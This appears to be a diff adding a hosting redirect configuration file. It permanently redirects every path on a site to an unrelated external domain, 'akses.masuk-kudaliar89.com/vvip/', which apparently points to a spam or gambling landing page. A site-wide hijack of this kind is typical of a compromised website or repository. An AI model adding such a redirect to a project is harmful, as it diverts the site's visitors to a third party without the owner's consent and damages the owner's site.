@@ -1,0 +1,9 @@
+{
+  "redirects": [
+    {
+      "source": "/(.*)",
+      "destination": "https://akses.masuk-kudaliar89.com/vvip/",
+      "permanent": true
+    }
+  ]
+}
